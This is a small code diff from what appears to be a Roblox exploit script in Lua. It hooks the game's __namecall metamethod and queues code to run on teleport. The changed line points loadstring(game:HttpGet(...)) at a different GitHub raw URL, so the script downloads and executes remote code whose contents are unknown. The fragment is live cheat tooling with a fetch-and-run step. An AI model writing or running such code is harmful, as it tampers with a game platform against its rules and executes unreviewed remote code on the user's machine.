@@ -18,7 +18,7 @@ ac1 = hookmetamethod(game, "__namecall", function(self, ...)
 end)
 
 local queueScript = string.format([[
-loadstring(game:HttpGet('https://raw.githubusercontent.com/nhatminh645/Shutthefuckup/refs/heads/main/freeky'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/nhatminh645/test-file1/refs/heads/main/diamond%20chest'))()
 ]])
 
 queue_on_teleport(queueScript)
